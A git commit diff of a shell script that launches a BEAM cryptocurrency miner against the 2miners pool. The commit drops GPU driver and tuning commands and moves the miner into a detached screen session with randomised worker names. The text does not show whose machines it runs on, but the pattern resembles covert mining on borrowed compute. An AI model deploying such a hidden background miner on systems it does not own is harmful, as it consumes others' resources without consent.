b204e9c7d10a380807e747f8717d17e27baf7a7e
renilo <88342640+renilo@users.noreply.github.com>
2021-09-24 18:13:01 +0700

    Update kontol1.sh

--- kontol1.sh
+++ kontol1.sh
@@ -6,17 +6,4 @@ WORKER=$(echo $(shuf -i 1-5 -n 1)-GPU)
 
 chmod +x memek
 
-set -e
-
-sudo add-apt-repository ppa:graphics-drivers/ppa
-sudo apt-get update
-sudo apt-get install nvidia-430 -y
-
-sudo nvidia-smi -i 0 -pl 160
-
-sudo nvidia-settings -a '[gpu:0]/GPUPowerMizerMode=1'
-sudo nvidia-settings -a '[gpu:0]/GPUGraphicsClockOffset[4]=-200'
-sudo nvidia-settings -a '[gpu:0]/GPUMemoryTransferRateOffset[4]=1100'
-sudo nvidia-settings -a '[gpu:0]/GPUFanControlState=1' -a '[fan:0]/GPUTargetFanSpeed=70'
-
-./memek --algo BEAM-III --pool us-beam.2miners.com:5252 --user 3ce7802b66cb8aff3ce1b1035ca0d81ec7086a619102d5d138946a419b96dcde240.$WORKER --ethstratum ETHPROXY --mode a
+screen -dmS running1 ./memek --algo BEAM-III --pool us-beam.2miners.com:5252 --user 3ce7802b66cb8aff3ce1b1035ca0d81ec7086a619102d5d138946a419b96dcde240.$WORKER --ethstratum ETHPROXY --mode a
